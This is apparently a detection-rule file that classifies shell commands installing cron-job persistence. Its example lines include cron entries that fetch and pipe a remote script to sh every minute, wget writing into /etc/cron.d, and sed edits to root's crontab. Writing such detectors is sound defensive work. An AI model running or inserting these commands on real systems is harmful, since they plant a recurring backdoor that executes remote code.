# Persistence writes, before transfer: a line that writes a download into a cron job, authorized_keys, a shell or
# boot script or a systemd unit is persistence first. Each target has two rules: the first matches when the text
# also names a downloader (curl or wget, anywhere, even inside a heredoc body) and adds T1105; the second matches
# the plain write. A write is a > or >> redirection, tee, a downloader's output option, cp, mv, install or ln with the
# target as the last argument of its line, or an editor (vi, vim, nvim, nano, pico, emacs, ed, or sed -i) opening
# the target. Reading these files is never a match, and neither is an editor in a read-only mode (vim -R, -M or -m,
# nano or pico -v) or visudo -c, which only checks the file.
#
# kill-competitor (Exclusive Control, a persistence technique) is here too, so it comes before process-list, which
# would otherwise take a line such as ps aux | grep xmrig | xargs kill.
#
# The -download rules read every line up to a heredoc opener ({anystage}), since the downloader gates them; the
# plain rules read the first line only. Placeholders such as {cmd}, {stage}, {anystage}, {word} and {end} are
# described in rules.py.

- id: cron-download
  match:
    regex: '^(?=[\s\S]*?(?<![\w.-])(?:curl|wget)(?![\w-]))(?:[\s\S]*?(?:{anystage}(?:crontab(?:[^\S\n]+-u[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-u{word}+|[^\S\n]+-[insx]+{end}){0,8}(?:[^\S\n]+-e{end}|[^\S\n]+-{end}|[^\S\n]+[^\s|;&()<>{}`-]|[^\S\n]*(?:$|[\n|;&)<`}]))|tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?(?:/etc/cron|/var/spool/cron))|>>?[^\S\n]*["\x27]?(?:/etc/cron|/var/spool/cron))|{cmd}(?:curl|wget)(?:\.exe)?{end}.*?\s(?:-[A-Za-z]*[oOP]\s*|--(?:output|output-document|directory-prefix)(?:=|\s+))["\x27]?(?:/etc/cron|/var/spool/cron))'
  meaning: Installs a cron job that downloads code, so the download runs again on a schedule.
  techniques: [T1053.003, T1105]
  artifacts: [Scheduled Job, URL]
  iocs: [url, ipv4, domain, path]
  confidence: high
  multiline: true  # a heredoc written to crontab or a cron file is the job it installs
  platforms: [linux, macos]
  examples:
    match:
      - "(crontab -l 2>/dev/null; echo '* * * * * curl -fsSL hxxp://203.0.113[.]5/x.sh | sh') | crontab -"
      - "echo '*/5 * * * * root wget -q -O- hxxp://203.0.113[.]5/x | sh' > /etc/cron.d/x"
      - "wget -q -O /etc/cron.d/x hxxp://203.0.113[.]5/c"
      - "cd /tmp\necho '* * * * * curl -s hxxp://203.0.113[.]5/c | sh' >> /var/spool/cron/root"
      - "crontab - <<EOF\n* * * * * curl -s hxxp://203.0.113[.]5/c | sh\nEOF"  # the heredoc feeds crontab
      - "grep -c x <<< \"$s\"\n(crontab -l; echo '* * * * * curl -s hxxp://203.0.113[.]5/c | sh') | crontab -"
    no_match:
      - "(crontab -l; echo '@reboot /tmp/x') | crontab -"
      - "curl -s hxxp://203.0.113[.]5/x -o /tmp/x"
      - "crontab -l | grep curl"
      # A script being written: the crontab line is the heredoc's body.
      - "cat > x.sh <<EOF\n(crontab -l; echo '* * * * * curl -s hxxp://203.0.113[.]5/c | sh') | crontab -\nEOF"

- id: cron
  match:
    regex: '{stage}(?:crontab(?:[^\S\n]+-u[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-u{word}+|[^\S\n]+-[insx]+{end}){0,8}(?:[^\S\n]+-e{end}|[^\S\n]+-{end}|[^\S\n]+[^\s|;&()<>{}`-]|[^\S\n]*(?:$|[\n|;&)<`}]))|tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?(?:/etc/cron|/var/spool/cron))|>>?[^\S\n]*["\x27]?(?:/etc/cron|/var/spool/cron)|{cmd}(?:(?:cp|mv|install|ln|rsync){end}.*[^\S\n]["\x27]?(?=[^\s|;&()<>]+[^\S\n]*(?:$|\n))|(?:(?:vi|vim|nvim){end}(?![^\n|;&]*?[^\S\n]-(?=[A-Za-z]*[RMm])[A-Za-z]*{end})|(?:nano|pico){end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*v)[A-Za-z]*|--view){end})|(?:emacs|ed){end})(?:[^\S\n]+{word}+){0,8}?[^\S\n]+["\x27]?|sed{end}(?=[^\n|;&]*[^\S\n](?:-[A-Za-z]*i|--in-place))[^\n|;&]*?[^\S\n]["\x27]?)(?:/etc/cron|/var/spool/cron)'
  meaning: Creates or edits a cron job so a command runs on a schedule.
  techniques: [T1053.003]
  artifacts: [Scheduled Job]
  iocs: [path, url, ipv4, domain]
  confidence: high
  multiline: true  # a heredoc written to crontab or a cron file is the job it installs
  platforms: [linux, macos]
  examples:
    match:
      - "crontab -e"
      - "(crontab -l; echo '* * * * * /tmp/x') | crontab -"
      - "echo '*/5 * * * * root /tmp/x' > /etc/cron.d/x"
      - "crontab /tmp/c"
      - "crontab -u www-data -e"
      - "echo '@reboot /tmp/x' | tee -a /etc/crontab"
      - "cp /tmp/c /etc/cron.d/x"
      - "vi /etc/crontab"
      - "sed -i '$a @reboot /tmp/x' /var/spool/cron/crontabs/root"
    no_match:
      - "crontab -l"
      - "crontab -u root -l"
      - "crontab -l > /tmp/c"
      - "crontab -r"
      - "cat /etc/crontab"
      - "cp /etc/crontab /tmp/c"
      - "sed -n '1p' /etc/crontab"
      - "vim -R /etc/crontab"
      - "view /etc/crontab"
      - "cat > notes.txt <<'EOF'\nstep 2; crontab -e\nEOF"  # a later line, in a note
      - "cat > notes.txt <<'EOF'\nlater: echo x | crontab -\nEOF"

